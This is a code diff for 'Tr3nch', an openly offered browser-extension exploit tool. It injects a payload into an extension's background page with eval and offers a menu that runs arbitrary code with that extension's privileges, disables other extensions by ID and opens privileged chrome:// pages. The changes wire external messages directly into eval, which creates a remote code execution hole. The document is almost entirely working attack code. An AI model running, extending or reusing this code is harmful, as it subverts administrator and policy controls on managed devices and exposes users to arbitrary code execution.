@@ -1,17 +1,26 @@
 chrome.runtime.getBackgroundPage((background) => {
 	function payload() {
-		chrome.runtime.onMessage.addListener(function(message) {
-			switch(message.cmd) {
+		const onMessage=function(msg) {
+			switch(msg.cmd) {
 				case "runCode":
 					/* Since we're the background page, we'll want to be able to run code from the menu, and
 					it just so happens Sh0vel requires eval, soooooo...*/
-					eval(message.code);
+					eval(msg.code);
 					break;
 				case "disable":
-					chrome.management.setEnabled(message.id, !message.disable);
+					chrome.management.setEnabled(msg.id, !msg.disable);
+					break;
+				case "tabOpen":
+					chrome.tabs.create({}, () => {
+						chrome.tabs.update({url: msg.url});
+						chrome.tabs.reload();
+					});
 					break;
 			}
-		});
+		}
+		chrome.runtime.onMessage.addListener(onMessage);
+		chrome.runtime.onMessageExternal.addListener(onMessage);
+		
 		chrome.browserAction.enable(); /* Some extensions like to be silly and disable browserAction */
 		chrome.browserAction.onClicked.addListener(function() {
 			function tabPayload() {
@@ -33,13 +42,13 @@ chrome.runtime.getBackgroundPage((background) => {
 				/* For convenience, we'll want to run code as the extension too, as it may also
 				have useful permissions that can be exploited.*/
 				const asExt=function(code) {
-					chrome.runtime.sendMessage(chrome.runtime.id, {cmd: "runCode", code: code});
+					chrome.runtime.sendMessage({cmd: "runCode", code: code});
 				}
 
 				/* Here we load in the base GUI, the options will be filled in later by loadMenuItems. */
 				const loadMenuHTML=function() {
-					/* I suck at css lmao */
-					const menuHTML=`
+					document.documentElement.innerHTML=`
+					<!DOCTYPE html>
 					<html lang="en">
 						<head>
 							<title>Tr3nch</title>
@@ -50,10 +59,14 @@ chrome.runtime.getBackgroundPage((background) => {
 							<div id="locked"></div>
 							<div class="topBar">
 								<h1>Tr3nch</h1>
+								<p>
+									Current Extension: ${chrome.runtime.getManifest().name} (${chrome.runtime.id}), Current Page: ${window.origin.replace("chrome://","")}
+								</p>
 								<a href="https://whelement.me">Whelement Homepage</a>
 								<a href="https://discord.gg/fPU8cUvf">Whelement Discord</a>
 								<a href="https://github.com/Whelement/Tr3nch">Source Code</a>
 								<button id="unload">Deload Tr3nch</button>
+								<button id="pubkey">View Public Key</button>
 							</div>
 							<div id="opt-container">
 								<br>
@@ -84,7 +97,7 @@ chrome.runtime.getBackgroundPage((background) => {
 							}
 							.topBar{
 								width: 100%;
-								height: 100px;
+								height: 140px;
 								background-color: #2c3e50;
 								text-align: center;
 							}
@@ -104,6 +117,7 @@ chrome.runtime.getBackgroundPage((background) => {
 								text-align: center;
 								position: absolute;
 								left: 5%;
+								overflow-wrap: break-word;
 							}
 							#locked{
 								position: fixed;
@@ -172,7 +186,6 @@ chrome.runtime.getBackgroundPage((background) => {
 						</style>
 					</html>
 					`;
-					document.documentElement.innerHTML=menuHTML;
 				}
 
 				const message=function(header, text) {
@@ -321,7 +334,7 @@ chrome.runtime.getBackgroundPage((background) => {
 					<h1>Run Code As Background Page</h1>
 					<hr>
 					<p>Run code directly as the background page of the extension Tr3nch is injected into</p>
-					<textarea id="extEvalBox"></textarea>
+					<textarea spellcheck="false" id="extEvalBox"></textarea>
 					<br>
 					<button id="extEvalButton">Run as Background</button>
 					`;
@@ -336,7 +349,7 @@ chrome.runtime.getBackgroundPage((background) => {
 					<h1>Run Code As Sh0vel</h1>
 					<hr>
 					<p>Run code with direct access to this page's chrome API via Sh0vel. Access this page's DOM with window.opener.</p>
-					<textarea id="pbEvalBox"></textarea>
+					<textarea spellcheck="false" id="pbEvalBox"></textarea>
 					<br>
 					<button id="pbEvalButton">Run as Sh0vel</button>
 					`;
@@ -351,7 +364,7 @@ chrome.runtime.getBackgroundPage((background) => {
 					<h1>Run Code On This Page</h1>
 					<hr>
 					<p>Run code directly as this content script without chrome API access.</p>
-					<textarea id="pageEvalBox"></textarea>
+					<textarea spellcheck="false" id="pageEvalBox"></textarea>
 					<br>
 					<button id="pageEvalButton">Run as Page</button>
 					`;
@@ -372,7 +385,7 @@ chrome.runtime.getBackgroundPage((background) => {
 						let redir=document.createElement('button');
 						redir.innerText=page.replace("chrome://","");
 						/* I have no clue why asExt is undefined in the Function statement here, so we'll just manually send the message. */
-						redir.addEventListener('click', Function(`chrome.runtime.sendMessage(chrome.runtime.id, {cmd: "runCode", code: "chrome.tabs.create({}, () => {chrome.tabs.update({url: '${page}'});});"});`));
+						redir.addEventListener('click', Function(`chrome.runtime.sendMessage({cmd: "tabOpen", url: "${page}"});`));
 						redirBox.append(redir);
 					}
 					addPage('chrome://extensions');
@@ -409,14 +422,14 @@ chrome.runtime.getBackgroundPage((background) => {
 						`;
 						disableBox.querySelector('#disableIdButton').addEventListener('click', () => {
 							/* Unfortunately we are still a content script, so we do have to play by the rules :( */
-							chrome.runtime.sendMessage(chrome.runtime.id, {
+							chrome.runtime.sendMessage({
 								cmd: 'disable', 
 								id: document.querySelector('#disableIdBox').value,
 								disable: true
 							});
 						});
 						disableBox.querySelector('#enableIdButton').addEventListener('click', () => {
-							chrome.runtime.sendMessage(chrome.runtime.id, {
+							chrome.runtime.sendMessage({
 								cmd: 'disable', 
 								id: document.querySelector('#disableIdBox').value,
 								disable: false
@@ -781,6 +794,10 @@ chrome.runtime.getBackgroundPage((background) => {
 					/* Close the menu and reload the background page, clearing all traces of Tr3nch */
 					asExt('chrome.tabs.getSelected((cur) => {chrome.tabs.remove(cur.id);location.reload();});');
 				});
+				document.querySelector('#pubkey').addEventListener('click', () => {
+					/* This will work regardless of if the key is present in the manifest or not. */
+					message('Public Key',`Current extension's public key:<br><br> ${chrome.runtime.getManifest().key}`);
+				});
 			} /* As Page */
 
 			console.log("Injecting Tr3nch into current page");
@@ -823,6 +840,7 @@ chrome.runtime.getBackgroundPage((background) => {
 	as the background page to get persistence until the extension restarts */
 	if (background.location.href !== location.href) {
 		background.eval(`${payload.toString()};payload();`);
+
 	}else{
 		payload(); /* If this is already running as the background page then we don't need to use eval. */
 	}
